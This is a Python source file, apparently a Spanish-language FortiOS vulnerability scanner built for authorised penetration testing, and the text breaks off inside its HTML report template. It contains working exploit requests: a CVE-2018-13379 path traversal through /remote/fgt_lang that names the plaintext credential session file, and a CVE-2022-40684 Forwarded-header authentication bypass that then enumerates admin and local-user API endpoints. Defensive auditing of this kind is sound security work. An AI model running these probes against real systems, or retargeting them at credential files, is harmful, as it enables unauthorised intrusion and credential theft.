#!/usr/bin/env python3
"""
vamp_forticheck.py — Escáner de Vulnerabilidades y Exposición FortiOS
=======================================================================
VampSecure Labs · VampSecure Studios
Para Uso Exclusivo en Pruebas de Penetración Autorizadas — v1.0

DESCRIPCIÓN GENERAL
-------------------
Herramienta de auditoría de seguridad de alto rendimiento para dispositivos
Fortinet que ejecutan FortiOS (cortafuegos FortiGate, gateway SSL-VPN, interfaz
de administración web). Confirma la exposición real a CVEs críticos mediante
sondas pasivas y semi-activas, sin comprometer la integridad del servicio objetivo.

ARQUITECTURA DE EJECUCIÓN (3 fases por objetivo)
-------------------------------------------------
  Fase 1 — Detección de banner y versión (completamente pasiva)
    Realiza peticiones GET a /remote/login y /login para identificar la presencia
    de FortiOS mediante indicadores en el HTML y las cabeceras HTTP, extrayendo
    la versión del firmware con cuatro patrones regex distintos.

  Fase 2 — Verificación de CVEs (semi-activa, no destructiva)
    Lanza sondas específicas para confirmar cada vulnerabilidad:
    · CVE-2018-13379: Traversal de ruta hacia un binario público del sistema de
      ficheros (/lib/x86_64-linux-gnu/libssl.so). Si responde con contenido
      binario, confirma el vector SIN extraer el fichero de credenciales real
      (/dev/cmdb/sslvpn_websession).
    · CVE-2022-40684: Envío de la cabecera HTTP 'Forwarded: for=127.0.0.1'
      al endpoint /api/v2/cmdb/system/admin. Una respuesta 200 con datos de
      administrador confirma el bypass de autenticación sin realizar escrituras.
    · CVE-2023-27997 / CVE-2024-21762: Comparación de la versión detectada
      contra los rangos afectados documentados (no requiere sonda de red).
    · INFO-DISCLOSURE: Sondeo de /api/v2/monitor/system/status para detectar
      exposición de versión sin autenticación.

  Fase 3 — Análisis de vectores de exposición secundarios
    Solo se activa si FortiOS es confirmado o hay CVEs encontrados:
    · Enumera endpoints de la API REST accesibles con el bypass de CVE-2022-40684.
    · Audita cabeceras de seguridad (HSTS, X-Frame-Options).
    · Detecta WAF o CDN upstream.
    · Verifica si el portal SSL-VPN está expuesto públicamente.

MODELO DE PUNTUACIÓN DE RIESGO
-------------------------------
  score  = Σ (CVSS_base × factor_confirmación) + puntos_por_vectores_secundarios
  factor = 1.0 si confirmed=True, 0.55 si method=version_match
  niveles: CRITICAL ≥ 9.0 · HIGH ≥ 7.0 · MEDIUM ≥ 4.0 · LOW > 0 · INFO = 0

CONCURRENCIA
------------
  asyncio + aiohttp con un asyncio.Semaphore configurable (--concurrency).
  Un TCPConnector compartido reutiliza conexiones HTTP para reducir latencia.
  Los errores en un objetivo son aislados y no interrumpen el lote completo.

DEPENDENCIAS
------------
  aiohttp  >= 3.9.0   — Cliente HTTP asíncrono con soporte SSL opcional
  rich     >= 13.7.0  — Salida de consola con formato enriquecido y tablas

AUTORÍA
-------
  © VampSecure Studios — VampSecure Labs Security Research Division
  Todos los derechos reservados. Uso exclusivo en entornos autorizados.
"""

import asyncio
import aiohttp
import argparse
import json
import ipaddress
import sys
import re
from pathlib import Path
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()

# Cabecera ASCII impresa al inicio de cada ejecución
BANNER = r"""
  ____   ____    _    __  __ ____  _____ ____ _   _ ____  _____   _        _    ____ ____
 \ \ / / _  |  / \  |  \/  |  _ \/ ____/ ___| | | |  _ \| ____| | |      / \  | __ ) ___|
  \ V / (_| | / _ \ | |\/| | |_) \___ \| |___| | | | |_) |  _|   | |     / _ \ |  _ \___ \
   | |  \__, |/ ___ \| |  | |  __/ ___) |___  | |_| |  _ <| |___  | |___ / ___ \| |_) |__) |
   |_|     /_/_/   \_|_|  |_|_|   |____/\____|\___/|_| \_|_____| |_____/_/   \_|____/____/
          by VampSecure Studios · vamp-forticheck v1.0 · FortiOS Vulnerability Scanner
          ─────────────────────────────────────────────────────────────────────────────
          USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
"""

# =============================================================================
# BASE DE DATOS DE CVEs FORTIOS
# =============================================================================
# Estructura por entrada:
#   description     : Descripción legible del impacto
#   cvss            : Puntuación CVSS v3 base
#   severity        : Nivel de severidad NVD (CRITICAL / HIGH / MEDIUM / LOW)
#   component       : Componente de FortiOS afectado
#   affected_versions: Lista de rangos (version_minima, version_maxima) como tuplas
#                      de tres enteros (major, minor, patch), ambos extremos incluidos
#   mitigation      : Acción correctiva recomendada para el cliente
# =============================================================================
FORTIOS_CVE_DB: Dict = {
    "CVE-2018-13379": {
        "description": "FortiOS SSL-VPN — traversal de ruta no autenticado que expone el fichero de sesiones con credenciales en texto plano",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "SSL-VPN Web Portal",
        "affected_versions": [
            ((5, 6, 3), (5, 6, 7)),
            ((6, 0, 0), (6, 0, 4)),
        ],
        "mitigation": "Actualizar a FortiOS 5.6.8 / 6.0.5 o superior",
    },
    "CVE-2022-40684": {
        "description": "FortiOS/FortiProxy — bypass de autenticación mediante petición HTTP manipulada a la API REST de administración",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "Admin Web UI / REST API",
        "affected_versions": [
            ((7, 0, 0), (7, 0, 6)),
            ((7, 2, 0), (7, 2, 1)),
        ],
        "mitigation": "Actualizar a FortiOS 7.0.7 / 7.2.2 o superior; deshabilitar la interfaz HTTP/HTTPS de administración",
    },
    "CVE-2023-27997": {
        "description": "FortiOS SSL-VPN — desbordamiento de heap pre-autenticación que puede permitir ejecución remota de código (XORtigate)",
        "cvss": 9.2,
        "severity": "CRITICAL",
        "component": "SSL-VPN",
        "affected_versions": [
            ((6, 0, 0), (6, 0, 17)),
            ((6, 2, 0), (6, 2, 15)),
            ((6, 4, 0), (6, 4, 12)),
            ((7, 0, 0), (7, 0, 9)),
            ((7, 2, 0), (7, 2, 4)),
        ],
        "mitigation": "Actualizar a FortiOS 6.4.13 / 7.0.10 / 7.2.5 o superior; deshabilitar SSL-VPN como medida temporal",
    },
    "CVE-2024-21762": {
        "description": "FortiOS SSL-VPN — escritura fuera de límites no autenticada en el componente SSL-VPN; activamente explotada en la naturaleza",
        "cvss": 9.6,
        "severity": "CRITICAL",
        "component": "SSL-VPN",
        "affected_versions": [
            ((6, 0, 0), (6, 0, 17)),
            ((6, 2, 0), (6, 2, 15)),
            ((6, 4, 0), (6, 4, 14)),
            ((7, 0, 0), (7, 0, 13)),
            ((7, 2, 0), (7, 2, 6)),
            ((7, 4, 0), (7, 4, 2)),
        ],
        "mitigation": "Actualizar inmediatamente; deshabilitar SSL-VPN como mitigación temporal urgente",
    },
}

# =============================================================================
# MODELO DE DATOS
# =============================================================================

@dataclass
class ScanResult:
    """
    Contenedor de resultados para un objetivo escaneado.

    Campos
    ------
    target              : URL o IP del objetivo tal como fue introducido
    timestamp           : Fecha/hora de inicio del escaneo en UTC ISO-8601
    is_fortios          : True si se detectaron indicadores de FortiOS
    detected_version    : Versión de firmware extraída (ej. '7.0.5') o None
    banner              : Valor de la cabecera Server: de la primera respuesta
    cve_findings        : Lista de dicts con resultados de cada verificación CVE
    exposure_vectors    : Lista de dicts con vectores de exposición secundarios
    mitigations_detected: Mitigaciones activas detectadas (WAF, parches, etc.)
    risk_score          : Puntuación de riesgo compuesta (0.0–10.0)
    risk_level          : Nivel semáforo: CRITICAL / HIGH / MEDIUM / LOW / INFO
    error               : Mensaje de error de red o 'OUT_OF_SCOPE' si aplica
    """
    target: str
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    is_fortios: bool = False
    detected_version: Optional[str] = None
    banner: Optional[str] = None
    cve_findings: List[Dict] = field(default_factory=list)
    exposure_vectors: List[Dict] = field(default_factory=list)
    mitigations_detected: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    risk_level: str = "UNKNOWN"
    error: Optional[str] = None


# =============================================================================
# VALIDADOR DE ALCANCE (SCOPE)
# =============================================================================

class ScopeValidator:
    """
    Verifica que un objetivo esté dentro del alcance definido antes de lanzar
    cualquier sonda de red.

    El fichero de alcance (scope.txt) admite tres formatos por línea:
      · Rango CIDR     → 192.168.1.0/24
      · Wildcard       → *.ejemplo.com   (cualquier subdominio de ejemplo.com)
      · Host exacto    → vpn.ejemplo.com  o  10.0.0.1

    Las líneas que comienzan con '#' se ignoran como comentarios.

    Si no se proporciona fichero de alcance, todos los objetivos son válidos
    (el auditor acepta la responsabilidad total sobre el targeting).
    """

    def __init__(self, scope_file: Optional[str] = None):
        self.entries: set = set()
        # Si no hay fichero de scope, todas las IPs pasan la validación
        self.active = scope_file is not None
        if scope_file:
            self._load(scope_file)

    def _load(self, path: str):
        """Carga y normaliza las entradas del fichero de scope."""
        p = Path(path)
        if not p.exists():
            console.print(f"[bold red][!] Fichero de scope no encontrado: {path}[/bold red]")
            sys.exit(1)
        for line in p.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                self.entries.add(line.lower())
        console.print(f"[cyan][i] Scope cargado: {len(self.entries)} entradas desde {path}[/cyan]")

    def is_in_scope(self, target: str) -> bool:
        """
        Retorna True si el objetivo está dentro del alcance definido.

        El método intenta las tres formas de validación en orden:
        1. Coincidencia exacta de hostname/IP
        2. Coincidencia de wildcard (la entrada empieza por '*.')
        3. Pertenencia a rango CIDR (solo si el objetivo es una IP válida)

        Parámetros
        ----------
        target : str  — URL completa o host/IP del objetivo

        Retorna
        -------
        bool  — True si en scope o si no hay fichero de scope activo
        """
        if not self.active:
            return True

        # Extraer solo el hostname de URLs como https://host:443/path
        parsed = urlparse(target if "://" in target else f"https://{target}")
        host = (parsed.hostname or target).lower()

        for entry in self.entries:
            if entry == host:
                return True
            # Wildcard: *.dominio.com cubre sub.dominio.com pero no dominio.com
            if entry.startswith("*.") and host.endswith(entry[1:]):
                return True
            # Comprobación CIDR: solo aplica si el objetivo es una IP válida
            try:
                if ipaddress.ip_address(host) in ipaddress.ip_network(entry, strict=False):
                    return True
            except ValueError:
                pass  # No es una IP — es un hostname, continuar

        return False


# =============================================================================
# DETECTOR DE VERSIÓN FORTIOS
# =============================================================================

class VersionDetector:
    """
    Detecta la presencia de FortiOS y extrae la versión de firmware mediante
    análisis pasivo del HTML de respuesta y las cabeceras HTTP.

    No realiza peticiones adicionales: trabaja con el contenido de las
    respuestas ya obtenidas en la Fase 1.

    Indicadores de presencia
    ------------------------
    Cadenas características encontradas en el HTML o cabeceras que identifican
    de forma inequívoca un dispositivo FortiOS.

    Patrones de versión
    -------------------
    Se prueban cuatro expresiones regulares en orden de especificidad:
    1. FortiXxx v/- seguido de X.Y.Z  (más fiable, del HTML de login)
    2. version: "X.Y.Z"              (respuestas JSON de la API)
    3. Atributo version en cabeceras HTTP personalizadas
    4. build NNNNN                   (número de build como fallback)
    """

    # Cadenas cuya presencia en HTML o cabeceras indica un dispositivo FortiOS
    INDICATORS = [
        "fgt_lang", "sslvpn", "FortiGate", "fortinet", "/remote/",
        "FortiNet", "SSL-VPN", "SSLVPN", "fgt-gui",
    ]

    # Patrones regex probados en orden — el primero que hace match gana
    VERSION_RE = [
        re.compile(r'[Ff]orti[A-Za-z]*[\s/v-]+(\d+\.\d+\.\d+)', re.I),
        re.compile(r'"version"\s*:\s*"(\d+\.\d+\.\d+)"', re.I),
        re.compile(r'version["\s:=]+["\']?(\d+\.\d+\.\d+)', re.I),
        re.compile(r'build\s+(\d{4,5})', re.I),
    ]

    @classmethod
    def detect(cls, content: str, headers: Dict) -> Tuple[bool, Optional[str]]:
        """
        Analiza el HTML y las cabeceras de una respuesta HTTP para detectar
        FortiOS y su versión.

        Parámetros
        ----------
        content : str   — Cuerpo de la respuesta HTTP (HTML o JSON)
        headers : Dict  — Cabeceras HTTP de la respuesta como diccionario

        Retorna
        -------
        Tuple[bool, Optional[str]]
          - bool           → True si se detectaron indicadores de FortiOS
          - Optional[str]  → Versión extraída ('7.0.5') o None si no encontrada
        """
        # Combinar contenido y cabeceras en una sola cadena para simplificar búsqueda
        combined = content + str(headers)
        is_forti = any(ind.lower() in combined.lower() for ind in cls.INDICATORS)

        version = None
        for rx in cls.VERSION_RE:
            m = rx.search(combined)
            if m:
                version = m.group(1)
                break

        return is_forti, version

    @staticmethod
    def parse_version(v: str) -> Optional[Tuple[int, int, int]]:
        """
        Convierte una cadena de versión 'X.Y.Z' en una tupla comparable (X, Y, Z).

        Retorna None si el formato no es válido, para evitar errores en
        la comparación con rangos afectados de la base de datos.

        Ejemplos
        --------
        '7.0.5' → (7, 0, 5)
        '6.4'   → (6, 4, 0)  ← tercer componente se asume 0
        'texto' → None
        """
        try:
            parts = v.split(".")
            return (
                int(parts[0]),
                int(parts[1]) if len(parts) > 1 else 0,
                int(parts[2]) if len(parts) > 2 else 0,
            )
        except (ValueError, IndexError):
            return None


# =============================================================================
# VERIFICADOR DE CVEs
# =============================================================================

class CVEChecker:
    """
    Realiza sondas de red específicas para confirmar la explotabilidad de
    cada CVE de forma no destructiva.

    Principio de diseño
    -------------------
    Todas las sondas están diseñadas para obtener evidencia de vulnerabilidad
    sin:
      · Extraer datos sensibles reales (credenciales, configuraciones)
      · Modificar el estado del dispositivo objetivo
      · Interrumpir o degradar el servicio

    Para CVEs basados en versión (CVE-2023-27997, CVE-2024-21762) no existe
    un método pasivo de confirmación, por lo que se usa comparación de versión
    con confirmed=False y method='version_match'.
    """

    def __init__(self, session: aiohttp.ClientSession, timeout: int = 10):
        """
        Parámetros
        ----------
        session : aiohttp.ClientSession  — Sesión HTTP compartida con el scanner principal
        timeout : int                    — Tiempo máximo de espera por petición en segundos
        """
        self.session = session
        self.to = aiohttp.ClientTimeout(total=timeout)

    async def check_cve_2018_13379(self, base_url: str) -> Dict:
        """
        Sonda el vector de traversal de ruta CVE-2018-13379.

        Método de prueba
        ----------------
        En lugar de solicitar /dev/cmdb/sslvpn_websession (fichero de sesiones
        con credenciales), se solicita /lib/x86_64-linux-gnu/libssl.so.1.0.0,
        una librería compartida pública del sistema que confirma el traversal
        sin exponer datos de usuarios.

        Un dispositivo vulnerable responde con HTTP 200 y Content-Type
        application/octet-stream (binario), lo que confirma que la ruta de
        traversal funciona. Un dispositivo parcheado devuelve 403 o 404.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo (ej. https://10.0.0.1)

        Retorna
        -------
        Dict con campos:
          cve, confirmed (bool), method, evidence (str), impact (str),
          severity, cvss, description
        """
        resultado = {
            "cve": "CVE-2018-13379",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": FORTIOS_CVE_DB["CVE-2018-13379"]["description"],
        }

        # Ruta de sonda: librería pública del SO, no datos de sesión
        ruta_sonda = "/remote/fgt_lang?lang=/../../../../../../../lib/x86_64-linux-gnu/libssl.so.1.0.0"

        try:
            async with self.session.get(
                f"{base_url}{ruta_sonda}",
                timeout=self.to,
                allow_redirects=False,  # No seguir redirecciones — un 302 ya indica login
                ssl=False,
            ) as r:
                content_type = r.headers.get("Content-Type", "")

                if r.status == 200 and ("octet-stream" in content_type or "application/" in content_type):
                    # Leer solo los primeros 128 bytes para confirmar contenido binario
                    cabeza = await r.content.read(128)
                    if cabeza:
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            f"HTTP 200 en ruta de traversal; Content-Type: {content_type}; "
                            f"Bytes recibidos: {len(cabeza)}"
                        )
                        resultado["impact"] = (
                            "El fichero de sesión SSL-VPN (/dev/cmdb/sslvpn_websession) "
                            "con credenciales en texto plano puede ser extraído sin autenticación"
                        )
                elif r.status == 200:
                    # Algunos dispositivos responden 200 con HTML de error — no es traversal real
                    cuerpo = await r.text(errors="replace")
                    if "login" not in cuerpo.lower() and len(cuerpo) > 200:
                        resultado["confirmed"] = True
                        resultado["evidence"] = "HTTP 200 con contenido inesperado en ruta de traversal"
                        resultado["impact"] = "Traversal de ruta confirmado; extracción de credenciales posible"
                else:
                    resultado["evidence"] = f"HTTP {r.status} — objetivo posiblemente parcheado o sin SSL-VPN"

        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout — objetivo inaccesible o filtrado"
        except Exception as e:
            resultado["evidence"] = f"Error de red: {str(e)[:80]}"

        return resultado

    async def check_cve_2022_40684(self, base_url: str) -> Dict:
        """
        Sonda el bypass de autenticación CVE-2022-40684.

        Método de prueba
        ----------------
        El bypass funciona porque el firmware afectado trata las peticiones
        con la cabecera 'Forwarded: for=127.0.0.1' como provenientes del
        loopback local, saltándose la validación de credenciales.

        Se envía una petición GET (sin datos de escritura) al endpoint de
        listado de administradores. Si la respuesta es HTTP 200 con datos de
        configuración, el bypass está activo.

        Se usa User-Agent 'Report Runner' porque algunos análisis de Fortinet
        muestran que era el valor usado en los exploits originales para
        identificar el vector.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo

        Retorna
        -------
        Dict — misma estructura que check_cve_2018_13379
        """
        resultado = {
            "cve": "CVE-2022-40684",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": FORTIOS_CVE_DB["CVE-2022-40684"]["description"],
        }

        host = urlparse(base_url).hostname or base_url
        cabeceras_bypass = {
            "User-Agent": "Report Runner",
            # Cabecera que engaña al firmware haciéndole creer que la petición viene del loopback
            "Forwarded": f'for="[127.0.0.1]";by="[127.0.0.1]";host="{host}"',
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

        try:
            async with self.session.get(
                f"{base_url}/api/v2/cmdb/system/admin",
                headers=cabeceras_bypass,
                timeout=self.to,
                allow_redirects=False,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    # Verificar que la respuesta contiene estructura de datos de admin,
                    # no solo una página HTML de error disfrazada de 200
                    if any(clave in cuerpo for clave in ('"results"', '"admin"', '"status"')):
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            "HTTP 200 en /api/v2/cmdb/system/admin sin credenciales "
                            "(bypass por cabecera Forwarded); respuesta contiene datos de administrador"
                        )
                        resultado["impact"] = (
                            "Acceso administrativo completo sin autenticación; "
                            "el atacante puede añadir claves SSH o modificar cuentas de admin"
                        )
                    else:
                        resultado["evidence"] = "HTTP 200 con cuerpo inesperado — revisión manual recomendada"
                elif r.status in (401, 403):
                    resultado["evidence"] = f"HTTP {r.status} — protegido; posiblemente parcheado"
                elif r.status == 404:
                    resultado["evidence"] = "HTTP 404 — endpoint de API REST no presente"
                else:
                    resultado["evidence"] = f"HTTP {r.status}"

        except asyncio.TimeoutError:
            resultado["evidence"] = "Timeout"
        except Exception as e:
            resultado["evidence"] = f"Error de red: {str(e)[:80]}"

        return resultado

    async def check_api_info_disclosure(self, base_url: str) -> Dict:
        """
        Verifica si el endpoint de estado del sistema expone la versión sin autenticación.

        Este no es un CVE propio, pero es un vector de enumeración de información
        relevante porque permite al atacante conocer la versión exacta del firmware
        para seleccionar exploits específicos.

        Parámetros
        ----------
        base_url : str  — URL base del objetivo

        Retorna
        -------
        Dict con cve='INFO-DISCLOSURE' y confirmed=True si hay versión expuesta
        """
        resultado = {
            "cve": "INFO-DISCLOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": None,
            "severity": "MEDIUM",
            "cvss": 5.3,
            "description": "Divulgación de versión/estado sin autenticación via REST API",
        }
        try:
            async with self.session.get(
                f"{base_url}/api/v2/monitor/system/status",
                timeout=self.to,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    ver_m = re.search(r'"version"\s*:\s*"([\d.]+)"', cuerpo)
                    if ver_m:
                        resultado["confirmed"] = True
                        resultado["evidence"] = (
                            f"Versión {ver_m.group(1)} expuesta sin autenticación"
                        )
                        resultado["impact"] = (
                            "Permite selección precisa de exploits basados en versión"
                        )
        except Exception:
            pass  # Este chequeo es informativo; los errores de red no son bloqueantes

        return resultado

    def check_version_cves(self, version: Optional[str]) -> List[Dict]:
        """
        Mapea la versión detectada a CVEs conocidos sin sondas de red adicionales.

        Se usa para CVEs cuya confirmación requeriría explotación real (heap overflow,
        escrituras fuera de límites), que no es apropiada en una auditoría defensiva.

        Parámetros
        ----------
        version : Optional[str]  — Versión detectada en Fase 1 (ej. '7.0.5')

        Retorna
        -------
        List[Dict]  — Lista de findings con method='version_match' y confirmed=False.
                      La lista puede estar vacía si no hay versión o no hay coincidencia.
        """
        resultados = []
        if not version:
            return resultados

        tupla_ver = VersionDetector.parse_version(version)
        if not tupla_ver:
            return resultados

        # Iterar sobre todos los CVEs de la BD y comprobar si la versión cae en algún rango
        for cve_id, meta in FORTIOS_CVE_DB.items():
            for minimo, maximo in meta.get("affected_versions", []):
                if minimo <= tupla_ver <= maximo:
                    resultados.append({
                        "cve": cve_id,
                        "confirmed": False,
                        "method": "version_match",
                        "evidence": (
                            f"Versión {version} dentro del rango afectado "
                            f"{'.'.join(map(str, minimo))}–{'.'.join(map(str, maximo))}"
                        ),
                        "impact": meta["description"],
                        "severity": meta["severity"],
                        "cvss": meta["cvss"],
                        "description": meta["description"],
                        "mitigation": meta.get("mitigation"),
                    })
                    break  # Un CVE no puede aparecer dos veces aunque el rango haga match múltiple

        return resultados


# =============================================================================
# ANALIZADOR DE EXPOSICIÓN SECUNDARIA
# =============================================================================

class ExposureAnalyzer:
    """
    Tras confirmar uno o más CVEs, analiza la superficie de ataque secundaria
    para evaluar el impacto real de la explotación.

    Funciona en tres ejes:
      1. Superficie general (cabeceras de seguridad, WAF)
      2. Endpoints de API REST accesibles mediante el bypass CVE-2022-40684
      3. Portal SSL-VPN expuesto (incrementa el riesgo de CVE-2018-13379 et al.)

    Todos los análisis son de solo lectura: ninguna petición modifica el estado
    del dispositivo.
    """

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.to = aiohttp.ClientTimeout(total=8)

    async def analyze(self, base_url: str, cve_findings: List[Dict]) -> List[Dict]:
        """
        Orquesta el análisis de exposición según qué CVEs fueron confirmados.

        Parámetros
        ----------
        base_url     : str        — URL base del objetivo
        cve_findings : List[Dict] — Resultados de CVEChecker para este objetivo

        Retorna
        -------
        List[Dict]  — Lista de vectores de exposición encontrados
        """
        vectores: List[Dict] = []

        # Identificar qué CVEs han sido confirmados con sonda activa
        cves_confirmados = {f["cve"] for f in cve_findings if f.get("confirmed")}

        # Tareas concurrentes según el contexto
        tareas = [self._check_superficie(base_url)]

        if "CVE-2022-40684" in cves_confirmados:
            tareas.append(self._check_endpoints_api(base_url))

        # Si hay cualquier CVE SSL-VPN confirmado, verificar exposición del portal
        if cves_confirmados.intersection({"CVE-2018-13379", "CVE-2023-27997", "CVE-2024-21762"}):
            tareas.append(self._check_portal_sslvpn(base_url))

        resultados = await asyncio.gather(*tareas, return_exceptions=True)
        for r in resultados:
            if isinstance(r, list):
                vectores.extend(r)

        return vectores

    async def _check_superficie(self, base_url: str) -> List[Dict]:
        """
        Audita la superficie de seguridad básica del endpoint HTTPS:
        cabeceras de seguridad ausentes y presencia de WAF upstream.
        """
        vectores: List[Dict] = []
        try:
            async with self.session.get(base_url, timeout=self.to, ssl=False) as r:
                cabeceras = dict(r.headers)
                servidor = cabeceras.get("Server", "")

                # Detección de WAF/CDN: presencia en la cabecera Server o X-Powered-By
                if any(waf in servidor.lower() for waf in ("cloudflare", "akamai", "f5", "imperva")):
                    vectores.append({
                        "type": "WAF_DETECTED",
                        "description": f"WAF/CDN detectado: {servidor}",
                        "severity": "INFO",
                        "impact": "Algunos vectores de ataque pueden estar mitigados upstream",
                    })

                # HSTS ausente: permite ataques de downgrade HTTP que exponen credenciales VPN en tránsito
                if "Strict-Transport-Security" not in cabeceras:
                    vectores.append({
                        "type": "MISSING_HSTS",
                        "description": "HSTS no configurado",
                        "severity": "LOW",
                        "impact": "Posible downgrade a HTTP que expone credenciales VPN en tránsito",
                    })

                # X-Frame-Options ausente: vector de clickjacking sobre el panel de login
                tiene_csp_frame = "frame-ancestors" in cabeceras.get("Content-Security-Policy", "").lower()
                if "X-Frame-Options" not in cabeceras and not tiene_csp_frame:
                    vectores.append({
                        "type": "MISSING_XFRAME",
                        "description": "Protección contra clickjacking ausente",
                        "severity": "LOW",
                        "impact": "El panel de administración puede ser embebido en un iframe malicioso",
                    })

        except Exception:
            pass

        return vectores

    async def _check_endpoints_api(self, base_url: str) -> List[Dict]:
        """
        Enumera recursos sensibles de la API REST accesibles mediante el bypass
        de CVE-2022-40684.

        Esta comprobación solo se ejecuta si CVE-2022-40684 ha sido confirmado
        previamente, ya que presupone el bypass de autenticación activo.
        """
        vectores: List[Dict] = []

        # Cabecera de bypass idéntica a la de CVEChecker.check_cve_2022_40684
        cabeceras_bypass = {
            "User-Agent": "Report Runner",
            "Forwarded": 'for="[127.0.0.1]";by="[127.0.0.1]"',
        }

        # Endpoints con información especialmente sensible en caso de acceso sin auth
        endpoints_sensibles = [
            ("/api/v2/cmdb/system/interface",   "Enumeración de interfaces de red"),
            ("/api/v2/monitor/system/status",   "Metadatos del sistema y versión"),
            ("/api/v2/cmdb/vpn.ssl/settings",   "Configuración SSL-VPN"),
            ("/api/v2/cmdb/user/local",         "Base de datos de usuarios locales"),
        ]

        for endpoint, descripcion in endpoints_sensibles:
            try:
                async with self.session.get(
                    f"{base_url}{endpoint}",
                    headers=cabeceras_bypass,
                    timeout=self.to,
                    ssl=False,
                ) as r:
                    if r.status == 200:
                        vectores.append({
                            "type": "UNAUTH_API_ACCESS",
                            "endpoint": endpoint,
                            "description": descripcion,
                            "severity": "HIGH",
                            "impact": "Datos de configuración sensibles accesibles sin credenciales",
                        })
            except Exception:
                pass

        return vectores

    async def _check_portal_sslvpn(self, base_url: str) -> List[Dict]:
        """
        Comprueba si el portal web SSL-VPN está expuesto públicamente.

        Un portal expuesto multiplica el riesgo de CVEs pre-autenticación
        (CVE-2018-13379, CVE-2023-27997, CVE-2024-21762) porque amplía la
        superficie de ataque a cualquier actor en internet.
        """
        vectores: List[Dict] = []
        try:
            async with self.session.get(
                f"{base_url}/remote/login",
                timeout=self.to,
                ssl=False,
            ) as r:
                if r.status == 200:
                    cuerpo = await r.text(errors="replace")
                    if "sslvpn" in cuerpo.lower() or "ssl vpn" in cuerpo.lower():
                        vectores.append({
                            "type": "SSLVPN_PORTAL_EXPOSED",
                            "description": "Portal web SSL-VPN accesible públicamente",
                            "severity": "MEDIUM",
                            "impact": (
                                "Amplía la superficie de ataque para CVEs pre-autenticación: "
                                "CVE-2018-13379, CVE-2023-27997, CVE-2024-21762"
                            ),
                        })
        except Exception:
            pass

        return vectores


# =============================================================================
# GENERADOR DE INFORMES
# =============================================================================

class ReportGenerator:
    """
    Exporta los resultados del escaneo en formato JSON estructurado y HTML
    interactivo con tema oscuro (dark cyberpunk).

    Los informes HTML son documentos standalone sin dependencias externas
    (sin CDN, sin fuentes remotas) para poder abrirse en entornos aislados
    o adjuntarse directamente en informes de auditoría.
    """

    @staticmethod
    def to_json(results: List[ScanResult], ruta: str):
        """
        Exporta todos los resultados como JSON estructurado.

        Estructura del fichero:
          {
            "tool": "vamp-forticheck",
            "version": "1.0",
            "generated": "<ISO-8601>",
            "summary": { ... métricas agregadas ... },
            "results": [ ... un objeto por objetivo ... ]
          }

        Parámetros
        ----------
        results : List[ScanResult]  — Lista de resultados del escáner
        ruta    : str               — Ruta del fichero de salida (.json)
        """
        datos = {
            "tool": "vamp-forticheck",
            "version": "1.0",
            "generated": datetime.now(timezone.utc).isoformat(),
            "summary": {
                "total_objetivos": len(results),
                "fortios_confirmados": sum(1 for r in results if r.is_fortios),
                "cves_confirmados": sum(
                    1 for r in results for f in r.cve_findings if f.get("confirmed")
                ),
                "objetivos_criticos": sum(1 for r in results if r.risk_level == "CRITICAL"),
            },
            "results": [asdict(r) for r in results],
        }
        Path(ruta).write_text(json.dumps(datos, indent=2, default=str), encoding="utf-8")

    @staticmethod
    def to_html(results: List[ScanResult], ruta: str):
        """
        Genera un informe HTML standalone con tema oscuro tipo cyberpunk.

        El informe incluye:
          · Tarjetas de métricas resumen en la parte superior
          · Tabla principal con todos los objetivos y su nivel de riesgo
          · Badges de severidad con código de color por nivel
          · Pie de informe con fecha/hora de generación

        Parámetros
        ----------
        results : List[ScanResult]  — Lista de resultados del escáner
        ruta    : str               — Ruta del fichero de salida (.html)
        """
        # Construir las filas de la tabla
        filas = ""
        for r in results:
            if r.error == "OUT_OF_SCOPE":
                continue
            cves_confirmados = [f["cve"] for f in r.cve_findings if f.get("confirmed")]
            clase_fila = r.risk_level.lower()
            filas += f"""
            <tr class="fila-{clase_fila}">
                <td><code>{r.target}</code></td>
                <td>{"<span class='si'>SÍ</span>" if r.is_fortios else "<span class='no'>NO</span>"}</td>
                <td>{r.detected_version or "—"}</td>
                <td>{", ".join(cves_confirmados) if cves_confirmados else "—"}</td>
                <td><span class="badge badge-{clase_fila}">{r.risk_level}</span></td>
                <td>{r.risk_score:.1f}</td>
                <td>{r.error or "—"}</td>
            </tr>"""

        # Tarjetas de métricas resumen
        metricas = {
            "Objetivos": len([r for r in results if r.error != "OUT_OF_SCOPE"]),
            "FortiOS Detectado": sum(1 for r in results if r.is_fortios),
            "CVEs Confirmados": sum(1 for r in results for f in r.cve_findings if f.get("confirmed")),
            "Objetivos Críticos": sum(1 for r in results if r.risk_level == "CRITICAL"),
        }
        tarjetas = "".join(
            f'<div class="tarjeta"><div class="valor">{v}</div><div class="etiqueta">{k}</div></div>'
            for k, v in metricas.items()
        )

        html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>vamp-forticheck — Informe {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
